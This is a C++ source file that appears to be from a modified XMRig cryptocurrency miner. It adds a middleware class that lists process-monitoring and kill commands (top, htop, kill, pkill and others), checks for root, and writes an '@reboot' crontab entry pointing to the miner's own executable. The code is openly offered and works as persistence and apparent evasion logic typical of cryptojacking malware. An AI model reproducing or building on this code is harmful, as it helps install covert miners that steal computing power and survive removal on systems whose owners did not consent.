/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 * Copyright (c) 2024 smugg99          <https://github.com/smugg99>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "base/io/log/Log.h"
#include "core/ProgramArgs.h"
#include "core/Middleware.h"

#include <limits.h> 
#include <iostream>
#include <fstream>
#include <cstdlib>
#include <vector>
#include <unistd.h>
#include <sys/stat.h> 
#include <string>
#include <sstream>

Middleware::Middleware() {
	commandMap = {
		{"top", MONITORING},
		{"htop", MONITORING},
		{"atop", MONITORING},
		{"gtop", MONITORING},
		{"kill", KILLING},
		{"pkill", KILLING},
		{"killall", KILLING}
	};
}

bool Middleware::isLaunchedAsRoot() {
	return geteuid() == 0;
}

bool Middleware::sanitizeProgramArgs(ProgramArgs* args) {
	if (args == nullptr || args->argv == nullptr) {
		return false;
	}

	for (int i = 0; i < args->argc; ++i) {
		std::string arg(args->argv[i]);
		auto it = commandMap.find(arg);

		if (it != commandMap.end()) {
			CommandType type = it->second;
			switch (type) {
			case MONITORING:
				LOG_WARN("Monitoring command detected: %s", arg.c_str());
				break;
			case KILLING:
				LOG_WARN("Killing command detected: %s", arg.c_str());
				break;
			default:
				LOG_WARN("Unknown command detected: %s", arg.c_str());
				break;
			}
			return false;
		}
	}

	return true;
}

void Middleware::addToCron() {
	char exePath[PATH_MAX];

	ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
	if (len != -1) {
		exePath[len] = '\0';
	}
	else {
		LOG_ERR("Failed to get the path of the executable.");
		return;
	}

	LOG_INFO("Path of the executable: %s", exePath);

	std::string checkCommand = "crontab -l | grep -q '" + std::string(exePath) + "'";

	// Check if the entry already exists in the crontab file
	if (system(checkCommand.c_str()) != 0) {
		std::stringstream addCommand;
		addCommand << "crontab -l | { cat; echo \"@reboot " << exePath << "\"; } | crontab -";


		if (system(addCommand.str().c_str()) != 0) {
			LOG_ERR("Failed to add entry to crontab.");
		}
		else {
			LOG_INFO("Entry added to crontab.");
		}
	}
	else {
		LOG_WARN("Entry already exists in crontab.");
	}
}